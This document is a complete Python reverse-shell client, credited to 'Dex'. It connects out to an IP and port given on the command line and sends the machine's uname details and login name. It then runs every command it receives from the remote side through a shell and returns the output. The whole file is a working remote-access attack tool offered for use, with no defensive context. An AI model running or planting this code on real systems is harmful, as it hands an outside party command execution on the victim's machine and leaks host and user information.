import socket,subprocess,getopt,sys,os




def usage():

	print("\nReverse TCP (Client) by Dex")
	print()
	print("Usage: connect.py <ip> <port>")
	print("Example: connect.py 192.168.0.4 8000")
	print("Example: connect.py 62.37.142.7 1337")
	sys.exit(0)


def main():
	try:
		ip = str(sys.argv[1])
		port = int(sys.argv[2])
	except:
		print("[!] No Arguments Specified!")
		usage()
		sys.exit(1)
	connect(ip,port)

def connect(ip,port):

	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		try:
			s.connect((ip,port))
		except:
			print("[!] Unable to connect! Is server listening?")
			sys.exit(1)

		x_info = ""
		for x in os.uname():
			x_info += x + ","
		x_info += os.getlogin()
		x_info = x_info.encode('utf-8')
		s.send(x_info)
		shell(s)

def shell(s):

	while 1:
		command = s.recv(1024)
		command = command.decode('utf-8')

		if command != "exit":
			sh = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

			out, err = sh.communicate()

			result = out + err
			s.send(result)
		else:
			break
	s.close()

if __name__ == "__main__":
	main()
